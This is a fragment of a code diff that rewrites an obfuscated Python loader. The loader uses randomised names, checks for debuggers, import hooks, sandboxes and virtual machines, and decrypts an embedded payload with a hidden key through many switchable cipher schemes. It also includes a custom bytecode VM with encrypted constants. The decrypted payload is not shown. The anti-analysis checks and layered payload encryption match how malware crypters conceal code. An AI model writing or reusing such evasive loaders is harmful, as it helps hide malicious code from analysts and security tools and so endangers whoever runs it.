+    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
+    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
+    return _op, _rd, _rs1, _rs2, _imm, 8
 
 def _vm_deserialize(_data):
     import struct
     _op_key = _data[:32]
     _decrypted = _data[32:]
-    
     _map = list(_decrypted[:256])
+    _flags = int.from_bytes(bytes(_map[252:256]), 'little')
+    _vl_flag = (_flags & 1) != 0
+    _poly_flag = (_flags & 8) != 0
+    _const_enc = (_flags & 2) != 0
+    _cfi_flag = (_flags & 4) != 0
     _pos = 256
+    
+    # Read constant encryption key (16 bytes if encrypted)
+    _const_key = None
+    if _const_enc:
+        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
+    
+    # Skip CFI table (if present)
+    if _cfi_flag:
+        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
+        for _ in range(_cfi_nb):
+            _pos += 12  # skip start(4) + len(4) + csum(4)
+    
+    # Constants (with optional decryption)
     _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
     _consts = []
     for _ in range(_cc):
         _t = _decrypted[_pos]; _pos += 1
         _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
         _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
+        # Decrypt string constants (type 4) if encryption is enabled
+        if _const_enc and _t == 4 and _const_key:
+            _dec_bytes = bytearray(len(_s))
+            for _j in range(len(_s)):
+                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
+            _s = bytes(_dec_bytes)
         if _t == 0: _v = None
         elif _t == 1: _v = _s == b'1'
         elif _t == 2: _v = int(_s)
@@ -177,148 +654,81 @@ def _vm_deserialize(_data):
     for _ in range(_nc):
         _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
         _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
-    _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
-    _code = _decrypted[_pos:_pos+_ic*8]
-    return _code, _consts, _names, _map, _op_key
+    if _vl_flag or _poly_flag:
+        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
+        _code = _decrypted[_pos:_pos+_code_sz]
+    else:
+        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
+        _code = _decrypted[_pos:_pos+_ic*8]
+    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag
 
 
-
-
-def _ralpr():
-    if _jwfcgd.gettrace() is not None:
-        _jwfcgd.stderr.write('error: debugger detected\n'); _jwfcgd.exit(1)
-    _qhdzf = bytes.fromhex("465b794e4d7b2e7d71605a2252605f67237b205952605c7321606d562f477f705b72257f442e7c47706727564172594450737921616d62234f4422702256216f2178505a277441665a45205054794f60437520664d6642204566797240615a606e537e6d74726f42504e6d73514f535a5b5d4446635c404f5562737e424d506d6e677a745d6321655e715a72467127736d5d6344747946785b4642214d624022527552202575235864407421587f6e446d2444214d515c6e7e5f515b71447d4721544e5e7d65786074516665642261675e7c452555517f236f24582252506e746d43417e56644e7d4e735367267a4f202126452e754320744e656467272755445b4e46457f5e5e6d51734e2225662f255a5c416643657d7f5c7b24714e23547f5d6e23466620742f4d562e27707c6f4d647a7f5e647a7d614059737f7a23665223464e245e236246535373405d45255440526e5f44532245636e2067676d42227c6e535550545a21636d797b237f67265a5c5f7b737f5c715f755b2470605f424124525a5e4540416d635e2660605a5b7d654d267b645f657f787f2f6e757b5c2740242e5c217876236127767027247b2e595323717e73707d5350417b6f65412f41635075725c534e5558566d7b505146586e204d65755f422f585b7b2f646425504e404e7f606576437d4461796770237f255570404672426f67746e5f5379427379222247592667545f7b6e6f786e7f7f2179617a2f23545f6f62785c4562766e405f7a47432e50515d5847266426735253745b455e5542726024765e64526e707061622250544d795a265658455b4671237b64524371265a25472f662641225f4e52527f202e627d4d4679247c507d4766615c6f4e5622794d40265e275c516e2f5f225e477d7a2e7d4d427a7f4e2225795f6f4e7541225f717c5055205c51216e7955552178447b235e72614d4250254e5b7b536d7c705f6555237d2253552e42252e5523725c43785e76567579532361632446585b557e41754160415653707d6420556041615d7b242779432355507a7b646745716f4d43587d227b406e5541527655646559502e527f2f5b6f455f4547726453546d66457d5b4055756158554258605e5e5d5e5526437f75766e7c4f705f635b42614e7445632f7c795d647b44745970615d277d525a757922635f596d587c45507b417f46635c63674166667d512f536661757c5943247b26646e7441505f56615341465465437245707e65677a75766e615c2076227c454e217f5456665563744d472f59465a4d716d784170432065657b227b6472504d7652584e52627263627351552f56647a276070505f7c4d7b5f47447c41517879587c215c2f6d547a615f4d56796546565a2526764e5f6d5b5c4456446221735c2351607f7f5f50595c23552f5e5e767d2f")
-    _qhdzf = bytes(_ ^ 23 for _ in _qhdzf).decode()
-    _jwfcgd.breakpointhook = None
+def _ibqzcl():
+    if _kzmuxh.gettrace() is not None:
+        _kzmuxh.stderr.write('error: debugger detected\n'); _kzmuxh.exit(1)
+    _ozpavmjdc = bytes.fromhex("f4dadcf98ceddad3cecbf3f2ebd5ffeed0d58cda8a8bf28ef8efffcefe84f2fcdfcbfbd0dfd4d2f58ccdd9cf898bebcff58bcfcef2d8f3fed7fff6d88488ee8e8ad9c4c485eecaf3f58ffeebe7d9f6d68aebffe5f4eaccfff7f6d8dbf9fbfee5feecfac78ef5fffbf18ef2f0e5f6e88ffcd4e5dad18bf8f5d1fa8aca8dcccccb88fbc8d1ecfc8c84efd788edd2d585cae9effad3fceadfedcbc784ebfeeafcc9c9f584cfffd2e9e4d484fbffcee5cbd8eefcd588f6fbcaece9d1f4f2fcc7efdefeecf088f8f2dcd785fad1f8f2cbdf8afae7f9d6f7c4cdd5c7d5f98f8c85cfd3f7f88ecadfd6f0eecb8bf4dfebf0f5ffccf9e9cbf0d384d5848ccee4efd0eafbc5dbfee9f3dc8bcadfd1faf4c985f6c9c4dee9edecdac5db8df0d7f3d4ff85eececee7cde9d58bcdcef3f08df6caf28bf4ecd1dae9c9f6f6f78dd78cead3d9dafad4caf9dad2ebf1d6e5d3f8edd5f3c9efd6de85fb84d3d8f084cc8efcfae4d58c8adaecd9fef9d7c98e8dfaf18ff1ced289dcccd5e7fa88888afa8d85d6fcd2c8cacaf8cf8ecef2ec8dfafee78aca8cfbf68cd98fd2dbd4c8e9efe4f5d2cdf6e5c78dc4dbf0cced8ed1888ffbd6d0e9cac78d8bcedecee8f0c9f4f388faffedebece585c4cae9c5d484d8dad6eefee4e9ccfbf6e9d5df88f1d6d3c7d8fbd4c8c8dad0feecc4dbedca8aeaffcffce5edf4de8cf6c8f4ffcac8d9d5ea89c88585f0c8d5dfdecd8ffbfbdaccf8ebf8fcd8e9f7c4e48dfacbde85f384cdffc4eafc8acdd6faeadbd98ad8f5ffdb89e984d8f68adae8e7d7f2cacdd2cacaf684fafcd0f7c7c9f5f0ffe8effee484d2d8c5e9caf08fedf385c7f8f08edfcb85cdd0ea89df85c48cdfedebd3cfeadeffd4d5d28bd1feffd7cc8eecfcf5decdeed68fe4c4caf8c589c9d9e8f0edd7d4ff88e8f6f6898ac9cf8ae7f5d8ccf2dedff9eaf2f8caecdceeef89e8fcedff85def1d2f1f1d2e4fcf9d0ded3d8cfdcf585e588d3cfedc7f7cac9fff3eaeff7de8bcefcf5cd888f8bd0f1d1f6d2d5e4dbc7cfd9e9f5cfd1cbdf88f0f1f38cfbf6f2ebc589ecdad0ea84f18afafffaedf289ca84ffccf6eae4d0f7d388f4d2f4e7caf0eeebecdaf1e58af5d4f58ee8ead6dcfbcee8d2f5d3fed38ff1ecf4ecf0cddae5f5e8dae58acdd7e8fecdd5fadc89d08e8af8ffd9f8cceacbd1c4dbcec5fff2f6d6def4fbffeae9e7e5dae5cf8dd7e7c8c4cac8cff88ffedcd58de8c9f6f8d1ffe9ebd1f3e8ecfcdcebf7e48fc4c5eeeae4d389f388eddbe58bfede8acdf8f98d8acee9effff1e5d3fce5cdebf5cbecfcdfe7d48bedf3fad5defedfedd0f7ebf0dfd8d7d4c58be884f7e9e4efdedaded8fbe9cd84c78bf4c4f1d48b8cedc4eb898fe8d3facfcedcd4f5ffebd6c8f3f188f1ca8af9e88f8e88e4fbf2d9d0efe9e7cdfbf6c7d5fbd6dff0c5dfebdce488cecaff")
+    _ozpavmjdc = bytes(_ ^ 189 for _ in _ozpavmjdc).decode()
+    _kzmuxh.breakpointhook = None
     for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
-        if _qm in _jwfcgd.modules:
-            _jwfcgd.stderr.write('error: debugger detected\n'); _jwfcgd.exit(1)
-    _dmpfr = _uxujbpzjd.b64decode(_rtwmhg)
+        if _qm in _kzmuxh.modules:
+            _kzmuxh.stderr.write('error: debugger detected\n'); _kzmuxh.exit(1)
+    _zoicqg = _nekcm.b64decode(_ssiqzv)
     for _qn in ('__import__','compile','exec'):
-        _qf = getattr(_jwfcgd.modules.get('builtins'), _qn, None)
+        _qf = getattr(_kzmuxh.modules.get('builtins'), _qn, None)
         if _qf is not None:
             _qg = getattr(_qf, '__name__', '')
             if _qg != _qn:
-                _jwfcgd.stderr.write('error: hook detected\n'); _jwfcgd.exit(1)
-    if len(_jwfcgd.meta_path) > 5:
-        _jwfcgd.stderr.write('error: import hook detected\n'); _jwfcgd.exit(1)
-    if getattr(_jwfcgd, 'flags', None) and _jwfcgd.flags.no_user_site:
-        _jwfcgd.stderr.write('error: sandbox detected\n'); _jwfcgd.exit(1)
+                _kzmuxh.stderr.write('error: hook detected\n'); _kzmuxh.exit(1)
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher as _mdpjc, algorithms as _zrldyp, modes as _xxelftcz
+    except ImportError:
+        _kzmuxh.stderr.write("error: cryptography not installed\n"); _kzmuxh.exit(1)
+
+    if len(_kzmuxh.meta_path) > 5:
+        _kzmuxh.stderr.write('error: import hook detected\n'); _kzmuxh.exit(1)
+    if getattr(_kzmuxh, 'flags', None) and _kzmuxh.flags.no_user_site:
+        _kzmuxh.stderr.write('error: sandbox detected\n'); _kzmuxh.exit(1)
     import os
-    if any(x in str(_jwfcgd.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
-        _jwfcgd.stderr.write('error: virtual machine detected\n'); _jwfcgd.exit(1)
-    if _padllgc == 3:
-        try:
-            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _nergrzltw
-        except ImportError:
-            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _wrelk = _dmpfr[16:-32]
-        _sjuwwke = _wrelk[:-16]; _ordocues = _wrelk[-16:]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=76)
-        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:44]; _guajrqqh = _qsfha[44:76]
-        _koskid = _ilyvmks.new(_guajrqqh, _wrelk, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _wrelk = _nergrzltw(_konvuj).decrypt(_mtejroptc, _sjuwwke + _ordocues, None)
-    elif _padllgc == 4:
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
-        except ImportError:
-            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
-        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _vaxfkla = _qbxcb(_yvqmfz.ChaCha20(_konvuj, _mtejroptc), mode=None)
-        _wrelk = _vaxfkla.decryptor().update(_sjuwwke)
-    elif _padllgc == 10:
-        _wrelk = bytes.fromhex(_dmpfr.decode('ascii'))
-    elif _padllgc == 1:
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
-        except ImportError:
-            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
-        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _vaxfkla = _qbxcb(_yvqmfz.AES(_konvuj), _ycobwuvb.CBC(_mtejroptc))
-        _wrelk = _vaxfkla.decryptor()
-        _wrelk = _wrelk.update(_sjuwwke) + _wrelk.finalize()
-        _ordocues = _wrelk[-1]
-        if _ordocues < 1 or _ordocues > 16 or not all(_ == _ordocues for _ in _wrelk[-_ordocues:]):
-            _jwfcgd.stderr.write("error: decryption failed\n"); _jwfcgd.exit(1)
-        _wrelk = _wrelk[:-_ordocues]
-    elif _padllgc == 7:
-        _wrelk = _uxujbpzjd.b32decode(_dmpfr)
-    elif _padllgc == 5:
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
-        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _wrelk = bytes(_sjuwwke[i] ^ _konvuj[i % 32] for i in range(len(_sjuwwke)))
-    elif _padllgc == 11:
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
-        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _ordocues = _konvuj[0]
-        _wrelk = bytearray()
-        for _ausrt in range(len(_sjuwwke)):
-            _ldntjew = _sjuwwke[_ausrt] ^ _ordocues
-            _wrelk.append(_ldntjew)
-            _ordocues = _sjuwwke[_ausrt] ^ _konvuj[ (_ausrt + 1) % len(_konvuj) ]
-            _ordocues = (((_ordocues << 3) & 0xFF) | (_ordocues >> 5)) ^ 0x5A
-        _wrelk = bytes(_wrelk)
-    elif _padllgc == 9:
-        def _cimbryr(_gzuows):
-            if _gzuows[:2] == b'<~': _gzuows = _gzuows[2:]
-            if _gzuows[-2:] == b'~>': _gzuows = _gzuows[:-2]
-            _zwubc = bytearray(); _xyhlkd = 0
-            while _xyhlkd < len(_gzuows):
-                if _gzuows[_xyhlkd] == 122:
-                    _zwubc.extend(b'\x00\x00\x00\x00'); _xyhlkd += 1; continue
-                _ljnpr = 0; _riailjj = 0
-                while _xyhlkd < len(_gzuows) and _riailjj < 5:
-                    _ljnpr = _ljnpr * 85 + (_gzuows[_xyhlkd] - 33); _xyhlkd += 1; _riailjj += 1
-                _xfanh = _riailjj - 1
-                if _xfanh > 0: _zwubc.extend(_ljnpr.to_bytes(4, 'big')[4-_xfanh:])
-            return bytes(_zwubc)
-        _wrelk = _cimbryr(_dmpfr)
-    elif _padllgc == 2:
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
-        except ImportError:
-            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
-        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _vaxfkla = _qbxcb(_yvqmfz.AES(_konvuj), _ycobwuvb.CTR(_mtejroptc))
-        _wrelk = _vaxfkla.decryptor().update(_sjuwwke)
-    elif _padllgc == 13:
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
-        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        import struct as _jcdvntmg
-        def _drzocix(k,c,n):
+    if any(x in str(_kzmuxh.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
+        _kzmuxh.stderr.write('error: virtual machine detected\n'); _kzmuxh.exit(1)
+    if _vqkbcm == 1:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
+        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _xzlpmi = _mdpjc(_zrldyp.AES(_zqlvo), _xxelftcz.CBC(_tfpbc))
+        _hejxfn = _xzlpmi.decryptor()
+        _hejxfn = _hejxfn.update(_wwgwruiwx) + _hejxfn.finalize()
+        _ippspzu = _hejxfn[-1]
+        if _ippspzu < 1 or _ippspzu > 16 or not all(_ == _ippspzu for _ in _hejxfn[-_ippspzu:]):
+            _kzmuxh.stderr.write("error: decryption failed\n"); _kzmuxh.exit(1)
+        _hejxfn = _hejxfn[:-_ippspzu]
+    elif _vqkbcm == 7:
+        _hejxfn = _nekcm.b32decode(_zoicqg)
+    elif _vqkbcm == 4:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
+        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _xzlpmi = _mdpjc(_zrldyp.ChaCha20(_zqlvo, _tfpbc), mode=None)
+        _hejxfn = _xzlpmi.decryptor().update(_wwgwruiwx)
+    elif _vqkbcm == 13:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
+        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        import struct as _agcdbge
+        def _rfoacoaks(k,c,n):
             s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
-            for i in range(0,32,4):s.append(_jcdvntmg.unpack('<I',k[i:i+4])[0])
+            for i in range(0,32,4):s.append(_agcdbge.unpack('<I',k[i:i+4])[0])
             s.append(c&0xFFFFFFFF)
-            for i in range(0,12,4):s.append(_jcdvntmg.unpack('<I',n[i:i+4])[0])
+            for i in range(0,12,4):s.append(_agcdbge.unpack('<I',n[i:i+4])[0])
             w=list(s)
             def q(a,b,c,d):
                 a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
@@ -336,119 +746,174 @@ def _ralpr():
                 w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                 w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
             r=bytearray()
-            for i in range(16):r.extend(_jcdvntmg.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
+            for i in range(16):r.extend(_agcdbge.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
             return bytes(r)
-        _ausrt = _jcdvntmg.unpack('<I',_mtejroptc[:4])[0]
-        _mtejroptc = _mtejroptc[4:]
-        _ldntjew = bytearray()
-        while len(_ldntjew) < len(_sjuwwke):
-            _ordocues = _drzocix(_konvuj, _ausrt, _mtejroptc)
-            for _hizqhxz in range(min(64, len(_sjuwwke) - len(_ldntjew))):
-                _ldntjew.append(_sjuwwke[len(_ldntjew)] ^ _ordocues[_hizqhxz])
-            _ausrt += 1
-        _wrelk = bytes(_ldntjew)
-    elif _padllgc == 0:
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
-        except ImportError:
-            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
-        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _vaxfkla = _qbxcb(_yvqmfz.AES(_konvuj), _ycobwuvb.ECB())
-        _wrelk = _vaxfkla.decryptor()
-        _wrelk = _wrelk.update(_sjuwwke) + _wrelk.finalize()
-        _ordocues = _wrelk[-1]
-        if _ordocues < 1 or _ordocues > 16 or not all(_ == _ordocues for _ in _wrelk[-_ordocues:]):
-            _jwfcgd.stderr.write("error: decryption failed\n"); _jwfcgd.exit(1)
-        _wrelk = _wrelk[:-_ordocues]
-    elif _padllgc == 12:
-        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
-        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
-        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
-        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
-        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
-            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
-        _ordocues = 3 + (_ldntjew[0] & 7)
-        _ldntjew = bytearray(_sjuwwke)
-        for _ausrt in range(_ordocues - 1, -1, -1):
-            _drzocix = (3 + _ausrt) & 7
-            _hizqhxz = (_ausrt * 0x1B + 0x5A) & 0xFF
-            for _mtejroptc in range(len(_ldntjew)):
-                _ordocues = _ldntjew[_mtejroptc]
-                _ordocues ^= _hizqhxz
-                _ordocues = ((_ordocues >> _drzocix) | ((_ordocues << (8 - _drzocix)) & 0xFF))
-                _ordocues ^= _konvuj[(_ausrt * len(_ldntjew) + _mtejroptc) % len(_konvuj)]
-                _ldntjew[_mtejroptc] = _ordocues
-        _wrelk = bytes(_ldntjew)
-    elif _padllgc == 6:
-        _wrelk = _uxujbpzjd.b64decode(_dmpfr)
-    elif _padllgc == 8:
-        _kpqdt = ('0','1','2','3','4','5','6','7','8','9',
+        _btiag = _agcdbge.unpack('<I',_tfpbc[:4])[0]
+        _tfpbc = _tfpbc[4:]
+        _xdgbgv = bytearray()
+        while len(_xdgbgv) < len(_wwgwruiwx):
+            _ippspzu = _rfoacoaks(_zqlvo, _btiag, _tfpbc)
+            for _zeqyjzfv in range(min(64, len(_wwgwruiwx) - len(_xdgbgv))):
+                _xdgbgv.append(_wwgwruiwx[len(_xdgbgv)] ^ _ippspzu[_zeqyjzfv])
+            _btiag += 1
+        _hejxfn = bytes(_xdgbgv)
+    elif _vqkbcm == 12:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
+        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _ippspzu = 3 + (_xdgbgv[0] & 7)
+        _xdgbgv = bytearray(_wwgwruiwx)
+        for _btiag in range(_ippspzu - 1, -1, -1):
+            _rfoacoaks = (3 + _btiag) & 7
+            _zeqyjzfv = (_btiag * 0x1B + 0x5A) & 0xFF
+            for _tfpbc in range(len(_xdgbgv)):
+                _ippspzu = _xdgbgv[_tfpbc]
+                _ippspzu ^= _zeqyjzfv
+                _ippspzu = ((_ippspzu >> _rfoacoaks) | ((_ippspzu << (8 - _rfoacoaks)) & 0xFF))
+                _ippspzu ^= _zqlvo[(_btiag * len(_xdgbgv) + _tfpbc) % len(_zqlvo)]
+                _xdgbgv[_tfpbc] = _ippspzu
+        _hejxfn = bytes(_xdgbgv)
+    elif _vqkbcm == 8:
+        _ldvxgkjl = ('0','1','2','3','4','5','6','7','8','9',
                 'A','B','C','D','E','F','G','H','I','J','K','L','M',
                 'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                 'a','b','c','d','e','f','g','h','i','j','k','l','m',
                 'n','o','p','q','r','s','t','u','v','w','x','y','z',
                 '!','#','$','%','&','(',')','*','+','-',';','<','=',
                 '>','?','@','^','_','`','{','|','}','~')
-        _fwbdrrpzq = {c:i for i,c in enumerate(_kpqdt)}
-        def _xsfaq(_yrkylcrgh):
-            _yzgtpn = bytearray(); _rtjkkid = 0
-            while _rtjkkid < len(_yrkylcrgh):
-                _hxhkojih = 0; _ivvzdeebe = 0
-                while _rtjkkid < len(_yrkylcrgh) and _ivvzdeebe < 5:
-                    _hxhkojih = _hxhkojih * 85 + _fwbdrrpzq[chr(_yrkylcrgh[_rtjkkid])]; _rtjkkid += 1; _ivvzdeebe += 1
-                _utammtvze = _ivvzdeebe - 1
-                if _utammtvze > 0: _yzgtpn.extend(_hxhkojih.to_bytes(4, 'big')[4-_utammtvze:])
-            return bytes(_yzgtpn)
-        _wrelk = _xsfaq(_dmpfr)
+        _icznco = {c:i for i,c in enumerate(_ldvxgkjl)}
+        def _alfnsb(_tmtow):
+            _uogyjf = bytearray(); _uorhw = 0
+            while _uorhw < len(_tmtow):
+                _glwxpyk = 0; _ndxey = 0
+                while _uorhw < len(_tmtow) and _ndxey < 5:
+                    _glwxpyk = _glwxpyk * 85 + _icznco[chr(_tmtow[_uorhw])]; _uorhw += 1; _ndxey += 1
+                _xngshu = _ndxey - 1
+                if _xngshu > 0: _uogyjf.extend(_glwxpyk.to_bytes(4, 'big')[4-_xngshu:])
+            return bytes(_uogyjf)
+        _hejxfn = _alfnsb(_zoicqg)
+    elif _vqkbcm == 11:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
+        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
